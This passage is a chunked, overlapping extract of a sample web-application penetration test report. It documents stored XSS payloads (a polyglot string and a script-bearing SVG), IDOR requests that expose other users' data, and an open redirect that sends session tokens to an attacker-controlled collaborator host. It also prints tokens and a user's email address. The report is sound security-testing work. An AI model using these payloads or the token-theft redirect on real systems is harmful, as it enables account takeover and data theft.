onclick=\\\"alert(1)\\\">test<\\/h1>\",\"email\":\"\",\"hasEmail\":false,\"phoneNumber\":\"\",\"verificationStatus\":\"unreviewe d\",\"mos\":null,\"hasAudio\":false,\"hasVideo\":false,\"browserName\":null,\"browserVersion\":null,\"isBrowserSuppo rted\":false,\"city\":\"<h1 onclick=\\\"alert(1)\\\">test<\\/h1>\",\"region\":null,\"country\":null,\"osName\":null,\"osVersion\":null,\"participantType\":\" main\",\"agencyId\":\"7\\/28\\/2021 12:34\",\"agencyUserId\":3402,\"assignedDiscussion\":null,\"notificationsOn\":false,\"autoTechCheckLink\":\"https:\\/ \\/{URL}\\/recruiting\\/videoResponse?recruitId=4be1087e-4172-4a9e-903f- 761c01deb8ce\",\"videoResponseLink\":null,\"recruitImageLink\":null,\"screenerLink\":\"\\/ajax\\/recruit\\/4be1087e- 4172-4a9e-903f- 761c01deb8ce\\/screener\",\"assignments\":[],\"availabilities\":[],\"isAgencyRecruit\":true,\"canBeUpdated\":true,\"ag encyName\":\"Assessor PPL1\",\"agencyEmail\":\"dev+assessor_purplesec.us@the company\",\"agencyPhoneNumber\":\"\",\"resubmittedAt\":null,\"techCheckLinkSent\":null,\"interviewInviteSent\":null ,\"techCheckStatus\":\"Not Sent\",\"techCheckNudgeSent\":false,\"inviteStatus\":null,\"dispositionHistory\":{\"conferences\":[],\"dispositions\":{} [...] The following screenshot shows the XSS executing",
    "metadata": {
      "doc_id": "Web-Application-Penetration-Test-Sample-Report",
      "chunk_id": 1
    }
  },
  {
    "text": "https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding\\n{\"id\":2350,\"name\":\"<h1 onclick=\\\"alert(1)\\\">test<\\/h1>\",\"email\":\"\",\"hasEmail\":false,\"phoneNumber\":\"\",\"verificationStatus\":\"unreviewe d\",\"mos\":null,\"hasAudio\":false,\"hasVideo\":false,\"browserName\":null,\"browserVersion\":null,\"isBrowserSuppo rted\":false,\"city\":\"<h1 onclick=\\\"alert(1)\\\">test<\\/h1>\",\"region\":null,\"country\":null,\"osName\":null,\"osVersion\":null,\"participantType\":\" main\",\"agencyId\":\"7\\/28\\/2021 12:34\",\"agencyUserId\":3402,\"assignedDiscussion\":null,\"notificationsOn\":false,\"autoTechCheckLink\":\"https:\\/ \\/{URL}\\/recruiting\\/videoResponse?recruitId=4be1087e-4172-4a9e-903f- 761c01deb8ce\",\"videoResponseLink\":null,\"recruitImageLink\":null,\"screenerLink\":\"\\/ajax\\/recruit\\/4be1087e- 4172-4a9e-903f- 761c01deb8ce\\/screener\",\"assignments\":[],\"availabilities\":[],\"isAgencyRecruit\":true,\"canBeUpdated\":true,\"ag encyName\":\"Assessor PPL1\",\"agencyEmail\":\"dev+assessor_purplesec.us@the company\",\"agencyPhoneNumber\":\"\",\"resubmittedAt\":null,\"techCheckLinkSent\":null,\"interviewInviteSent\":null ,\"techCheckStatus\":\"Not Sent\",\"techCheckNudgeSent\":false,\"inviteStatus\":null,\"dispositionHistory\":{\"conferences\":[],\"dispositions\":{} [...] The following screenshot shows the XSS executing in the browser after clicking on the First Name Field: Figure 2 - XSS Code Execution\\nInstance 3 It is possible to upload a malicious SVG file that will execute JavaScript on the application. Navigating to the Team Settings & Members page and clicking on any Upload Logo tab that allows SVG file extensions permits a malicious SVG to execute: Figure 3 - Malicious SVG File\\nThe following SVG payload was successfully uploaded: <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /> <script type=\"text/javascript\"> alert(\"document.domain\"); </script> </svg> Clicking the Upload tab option highlighted in the screenshot below temporarily stores the SVG: Figure 4 - Uploading Malicious SVG File\\nNavigating directly to the URL will trigger the XSS to execute: Figure 5 - Triggering XSS\\nNote, the malicious SVG file is also stored on a CloudFront server that is accessed by the application. Navigating directly to the CloudFront domain will also cause the XSS to execute: Figure 6 - Image Stored On CloudFront Server\\nInstance 4 It is possible to insert malicious JavaScript into the “Embed Project-Level Form” field using the following payload: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1234) )//%0D%0A%0d%0a//////--!&gt;\\x3csVg/\\x3e The following screenshot shows the malicious JavaScript being saved into this field in the GUI: Figure 7 - Malicious JavaScript Stored In GUI\\nAfter saving the payload in the field highlighted above then navigating back to the application dashboard page, the XSS will execute when a user clicks the Set Up Session tab: Figure 8 - XSS Execution Via \"Set Up Session\" Tab\\nAuthorization Restriction Bypass Severity: High Access controls enforce policies such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the user's limits. Instance 1 It is possible to bypass application GUI authorization restrictions and arbitrarily create teams that belong to other application users. The assessor@purplesec.us user makes the following HTTP request. The HTTP request modifies the \"ownerId\" parameter from 3401 to 3402. This modification will arbitrarily assign the team to the dev+assessor_purplesec.us@the company user without their consent. Moreover, the request also adds the assessor@purplesec.us user as one of this new team's members: POST /ajax/team/create HTTP/2 Host: {URL} Cookie: <snip> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@kd126yz624yclvld46y7azdqmhs8m2pqe.burpcollaborator.net Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate name=NOTREAL&isPublic=true&members%5B0%5D=assessor%40purplesec.us&ownerId=3402\\nDate: Wed, 28 Jul 2021 22:33:09 GMT Content-Type: application/json; charset=utf-8 Content-Length: 35 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Access-Control-Allow-Origin: https://{URL} Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X- Requested-With Vary: Origin,Accept-Encoding Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment;",
    "metadata": {
      "doc_id": "Web-Application-Penetration-Test-Sample-Report",
      "chunk_id": 2
    }
  },
  {
    "text": "nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Access-Control-Allow-Origin: https://{URL} Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X- Requested-With Vary: Origin,Accept-Encoding Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff {\"status\":\"success\",\"teamId\":\"123\"} The following screenshot shows the NOTREAL team appearing in dev+assessor_purplesec.us@the company dashboard.\\nFigure 9 - GUI Authorization Bypass An attacker can leverage this vulnerability to discover information about application users. Because the attacker has invited themselves to the team, information on the team's owners will be returned to the attacker, including their private email addresses. After creating the team NOTREAL8 and assigning it to the user with the ownerId 3405, the following information is returned to the attacker: GET /ajax/team/my HTTP/2 Host: {URL} Cookie:<snip> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard/no-referrer Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Cache-Control: max-age=0 Te: trailers Connection: close\\nDate: Wed, 28 Jul 2021 22:50:04 GMT Content-Type: application/json; charset=utf-8 Content-Length: 18640 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img- src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding {\"id\":\"128\",\"ownerId\":\"3405\",\"name\":\"NOTREAL8\",\"longitudinalLink\":\"\",\"theme\":null,\"createdAt\":\"2021-07-28 22:49:59\",\"isPublic\":true,\"orgName\":\"ABinBev\",\"orgId\":\"23\",\"members\":[{\"id\":\"3401\",\"email\":\"assessor@pur plesec.us\",\"name\":\"Testtestttt\",\"avatarUrl\":\"https:\\/\\/qa-stimulus.s3.us-west- 2.amazonaws.com\\/img\\/avatars\\/ab866751b1a395d24337ef7b83b05e7c-25x25.png?X-Amz-Content- Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz- Credential=AKIAWVJLWKOF7IEQEZN6%2F20210728%2Fus-west-2%2Fs3%2Faws4_request&X-Amz- Date=20210728T225004Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz- Signature=8805871b7546140360532cbccf74dfc413410273080a8871c30ec7562d7c8cce\",\"isOrgAdmin\":fal se},{\"id\":\"3405\",\"email\":\"rafael.silva@ab-inbev.com\",\"name\":\"Rafael\",\"avatarUrl\":\"https:\\/\\/qa-stimulus.s3.us- west-2.amazonaws.com\\/img\\/avatars\\/default-25x25.png?X-Amz-Content-Sha256=UNSIGNED- PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz- Credential=AKIAWVJLWKOF7IEQEZN6%2F20210728%2Fus-west-2%2Fs3%2Faws4_request&X-Amz- Date=20210728T225004Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz- Signature=d1ea9a7ab2290838e113a362e4038ec0c09798f7b01d5631df44a3f0600a09f1\",\"isOrgAdmin\":fals e}],\"projects\":[]}\\nSince the ownerId parameter is a sequential 4-digit number, this attack can be easily automated to quickly disclose information on all application users. Instance 2 It is possible to retrieve other users' project takeaway information. Changing the \"projectId\" parameter in the following HTTP request will reveal project information associated with that \"projectId.\" This is despite the user having no access to that project. The assessor@purplesec.us user has no authorization to view project information associated with the projectId 32489. However, the following HTTP request shows that the project's takeaway information successfully returned to the attacker: GET /ajax/takeaways/takeaways?projectId=32489 HTTP/2 Host: {URL} Cookie: <snip> Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard/no-referrer Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Cache-Control: max-age=0 Te: trailers Connection: close\\nDate: Wed, 28 Jul 2021 23:20:49 GMT Content-Type: application/json; charset=utf-8 Content-Length: 641 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img- src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding {\"questions\":{\"updatedAt\":\"2020-07-15 23:04:27\",\"sections\":[{\"sectionId\":\"364\",\"position\":\"1\",\"sectionText\":\"\",\"questions\":[{\"questionId\":\"1102\",\"posit ion\":\"1\",\"questionText\":\"What was the biggest takeaway you had from today's conversation?\"},{\"questionId\":\"1103\",\"position\":\"2\",\"questionText\":\"What did you learn?\"},{\"questionId\":\"1104\",\"position\":\"3\",\"questionText\":\"What action would you take based on what you heard today?\"}]},{\"sectionId\":\"365\",\"position\":\"2\",\"sectionText\":\"ok\",\"questions\":[{\"questionId\":\"1105\",\"position\":\"1\",\" questionText\":\"ok\"}]}]},\"lastSavedText\":\"Last saved by name@gmail.com on 11:04 pm, July 15, 2020\"}\\nAn attacker can easily automate this attack to retrieve all application project takeaway information stored on the application: Figure 10 - Project Takeaway Information\\nOpen Redirect Severity: High",
    "metadata": {
      "doc_id": "Web-Application-Penetration-Test-Sample-Report",
      "chunk_id": 3
    }
  },
  {
    "text": "conversation?\"},{\"questionId\":\"1103\",\"position\":\"2\",\"questionText\":\"What did you learn?\"},{\"questionId\":\"1104\",\"position\":\"3\",\"questionText\":\"What action would you take based on what you heard today?\"}]},{\"sectionId\":\"365\",\"position\":\"2\",\"sectionText\":\"ok\",\"questions\":[{\"questionId\":\"1105\",\"position\":\"1\",\" questionText\":\"ok\"}]}]},\"lastSavedText\":\"Last saved by name@gmail.com on 11:04 pm, July 15, 2020\"}\\nAn attacker can easily automate this attack to retrieve all application project takeaway information stored on the application: Figure 10 - Project Takeaway Information\\nOpen Redirect Severity: High Open redirection vulnerabilities arise when an application incorporates user-controllable data into a redirection target in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. Session Hijacking Using an open-redirect vulnerability, it is possible to steal the application user's sensitive cookie. Specifically, the access_token and id_token cookies. These two cookies will allow an attacker to interact with the application's GraphQL scheme as the victim. The following HTTP request was observed while interacting with the application: GET /auth/authorize?displayType=general&redirect_uri=https%3A%2F%2F{URL}%2Fquote%2FloginCallback% 3Fstep%3D%26autosave%3Dno%26exit%3Dno%26project%3D%26delegate%3Ddashboard HTTP/2 Host: {URL} Cookie: ajs_anonymous_id=c18977c2-e232-45f0-8b50-413c89650e2b; intercom-id-mgfmc61p=f6ae4012- b890-42a6-a7e9-f2b3c0c40334; intercom-session-mgfmc61p=; ajs_user_id=3410; dio=588a409f6514b4ba55471483afe819d1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Te: trailers Connection: close\\nHTTP/2 302 Found Date: Wed, 28 Jul 2021 23:29:42 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 0 Location:https://{URL}/quote/loginCallback?step=&autosave=no&exit=no&project=&delegate=dashboard&a ccess_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTE2NzgyLCJpYXQiOjE2Mjc1MTQ5ODJ9.g_-B3k44G- _SlZ8zKb5KwZtt_41OCGIJ51iy4- QbLrptfBKSKXj9RjUopOac_4VhHmGP4Wel4FSLN8NGqk2SPgEMHR_UdwUyIWXDzr0ONBBR9- WcHue9z1Dt8mAcmIIruwJVnON- PuZRJPeOfxkirIJK3Fbu4XX2AfOG3u6XXEU&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI 6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZ GlzY3Vzcy5pbyIsInN1YiI6IjM0MDEiLCJhdWQiOiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTY yNzUxNjc4MiwiaWF0IjoxNjI3NTE0OTgyLCJlbWFpbCI6Im1hcmNAcHVycGxlc2VjLnVzIiwiZW1haWxfdmVy aWZpZWQiOnRydWUsIm5hbWUiOiJUZXN0dGVzdHR0dCB0cmVzdCIsImdpdmVuX25hbWUiOiJUZXN0d GVzdHR0dCIsImZhbWlseV9uYW1lIjoidHJlc3QiLCJ6b25laW5mbyI6IkFmcmljYVwvQWNjcmEiLCJkaW86c m9sZXMiOltdfQ.1huEcioFrbx5yQGOKnaBStqNhq7u72zD5ZWgRWkuj2Qg4oZYKVut51M0pk2sOe0YHyFS NMdj6w_bJy5NnphEHB7RfKlUHhy3FhsEni6HsBZ8RxIa63JVKZbGwoc7YtVNEhHd1rRZQv0fh3MFgv3YiAo xnEwwkewH6t7nCKAL2l8&code=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU 2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJleHAiOjE2Mjc1MTY3ODIsIm5vbmNlIjoiMmVmYjc5MGMt NWEyNS00NDI1LWFkMDgtMGIwMjYxNmJkODcxIn0.Wwq8nWDgwk1o23GmIZN4bZGyEF- YPwbLpwzNkj4STDD8SovZ1FWuoWntjOBs8vKwzZ4sU8wWv1uXn- C2brQMzehJRgl3nGbSZQt0HFiWiOYNe3LShw9DWLW2GI4f96T9jPCHqKgkP7BvT7ReFmAiW5twghfCKx UJzGwpbSu9YME\\nSet-Cookie: access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTE2NzgyLCJpYXQiOjE2Mjc1MTQ5ODJ9.g_-B3k44G- _SlZ8zKb5KwZtt_41OCGIJ51iy4- QbLrptfBKSKXj9RjUopOac_4VhHmGP4Wel4FSLN8NGqk2SPgEMHR_UdwUyIWXDzr0ONBBR9- WcHue9z1Dt8mAcmIIruwJVnON-PuZRJPeOfxkirIJK3Fbu4XX2AfOG3u6XXEU; expires=Wed, 28-Jul-2021 23:59:42 GMT; Max-Age=1800; path=/; SameSite=Lax Set-Cookie: id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1 MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDEiLCJhdWQi OiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUxNjc4MiwiaWF0IjoxNjI3NTE0OTgyLCJlb WFpbCI6Im1hcmNAcHVycGxlc2VjLnVzIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOiJUZXN0d GVzdHR0dCB0cmVzdCIsImdpdmVuX25hbWUiOiJUZXN0dGVzdHR0dCIsImZhbWlseV9uYW1lIjoidHJlc3Qi LCJ6b25laW5mbyI6IkFmcmljYVwvQWNjcmEiLCJkaW86cm9sZXMiOltdfQ.1huEcioFrbx5yQGOKnaBStqNh q7u72zD5ZWgRWkuj2Qg4oZYKVut51M0pk2sOe0YHyFSNMdj6w_bJy5NnphEHB7RfKlUHhy3FhsEni6HsB Z8RxIa63JVKZbGwoc7YtVNEhHd1rRZQv0fh3MFgv3YiAoxnEwwkewH6t7nCKAL2l8; expires=Wed, 28-Jul- 2021 23:59:42 GMT; Max-Age=1800; path=/; SameSite=Lax The application sets both the access_token and id_token cookies then redirects the user to URL including both cookies as parameters. Note, the application uses the dio session cookie to validate the user. Replacing qa.life.io with a domain controlled by the attacker in the redirect_uri parameter will allow an attacker to steal these sensitive cookies. The following URL places a domain in the redirect_uri parameter controlled by the attacker: https://{URL}/auth/authorize?displayType=general&redirect_uri=https%3A%2F%2F6w3igq1rpluqx6862lo0w xxr7id91y.burpcollaborator.net\\nAfter accessing the malicious link as the user, dev+assessor_purplesec.us@the company is redirect to the attacker server: GET /auth/authorize?displayType=general&redirect_uri=https%3A%2F%2F6w3igq1rpluqx6862lo0wxxr7id91y.bu rpcollaborator.net HTTP/2 Host: {URL} Cookie: ajs_anonymous_id=c18977c2-e232-45f0-8b50-413c89650e2b; intercom-id-mgfmc61p=f6ae4012- b890-42a6-a7e9-f2b3c0c40334; intercom-session-mgfmc61p=; ajs_user_id=3412; 6c9156982306a2f4166f81c4d98f2d3a; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Te: trailers Connection: close\\nHTTP/2 302 Found Date: Thu, 29 Jul 2021 00:23:23 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 0 Location: https://6w3igq1rpluqx6862lo0wxxr7id91y.burpcollaborator.net?access_token=eyJ0eXAiOiJKV1QiLCJhbGci OiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodH RwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3MuaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3 NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf4cmSQO23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZM Bsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZDsvxLYHy7a- npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY&id_token=e yJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ 2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJhdWQiOiJkaXNjdX NzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2LCJlbWFpbCI6Im RldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOi JNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X25hbWUiOiJVcyIsI npvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkhUe3w0_I8iJLaL0 mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB7qObPQTx- QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F- tPakKOKvnNxWqO0j1GQkQ76w&code=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NW ViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJleHAiOjE2Mjc1MjQxOTYsIm5vbmNlIjoiMThmOD YyODgtMzI1OS00ZTUwLThhM2MtMmM2NzY1MzJiZmM0In0.qXcWRouK4- AgGGAfNPiGwxeq2sb3Zpba7a0pKdCR- pbl7zUVV9_VzE3fy3acfIlKiSpCjlHPaowOg7P0BWhEf2tVkPxOap1kv18Zsp0Biw89An-OX_QSv8gv3nmVd- I2gGGomOXjxodGa3Q9QFKVLRh0XHc5ucuubWBCKCHcWMw\\nServer: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img- src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Set- Cookie:access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1 MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc 2N1c3MuaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf 4cmSQO23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZMBsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZD svxLYHy7a- npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY; expires=Thu, 29-Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax Set- Cookie:id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQ xMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJ hdWQiOiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2 LCJlbWFpbCI6ImRldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRyd WUsIm5hbWUiOiJNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X2 5hbWUiOiJVcyIsInpvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkh Ue3w0_I8iJLaL0mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB 7qObPQTx-QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F-tPakKOKvnNxWqO0j1GQkQ76w; expires=Thu, 29- Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax\\nThe application sets both sensitive cookies in the HTTP response parameters then redirects",
    "metadata": {
      "doc_id": "Web-Application-Penetration-Test-Sample-Report",
      "chunk_id": 4
    }
  },
  {
    "text": "1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Set- Cookie:access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1 MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc 2N1c3MuaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf 4cmSQO23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZMBsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZD svxLYHy7a- npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY; expires=Thu, 29-Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax Set- Cookie:id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQ xMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJ hdWQiOiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2 LCJlbWFpbCI6ImRldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRyd WUsIm5hbWUiOiJNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X2 5hbWUiOiJVcyIsInpvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkh Ue3w0_I8iJLaL0mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB 7qObPQTx-QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F-tPakKOKvnNxWqO0j1GQkQ76w; expires=Thu, 29- Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax\\nThe application sets both sensitive cookies in the HTTP response parameters then redirects the dev+assessor_purplesec.us@the company user to the attacker-controlled 